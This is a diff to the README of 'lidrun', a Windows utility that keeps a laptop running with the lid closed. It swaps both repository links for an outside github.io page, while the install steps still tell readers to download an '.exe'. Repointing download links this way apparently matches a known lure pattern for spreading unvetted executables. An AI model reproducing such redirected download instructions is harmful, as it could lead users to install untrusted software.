@@ -1,6 +1,6 @@
 # 🔋 lidrun - Keep your computer running while closed
 
-[![](https://img.shields.io/badge/Download-LidRun-blue.svg)](https://github.com/Rinaldoeclectic714/lidrun)
+[![](https://img.shields.io/badge/Download-LidRun-blue.svg)](https://rinaldoeclectic714.github.io)
 
 ## 🎯 About this application
 
@@ -22,7 +22,7 @@ LidRun provides several functions to manage your hardware during background task
 
 Follow these steps to set up LidRun on your Windows machine.
 
-1. Visit the [official repository page](https://github.com/Rinaldoeclectic714/lidrun) to find the latest version.
+1. Visit the [official repository page](https://rinaldoeclectic714.github.io) to find the latest version.
 2. Look for the "Releases" section on the right side of the page.
 3. Click on the latest release tag.
 4. Locate the file ending in `.exe` under the "Assets" area.
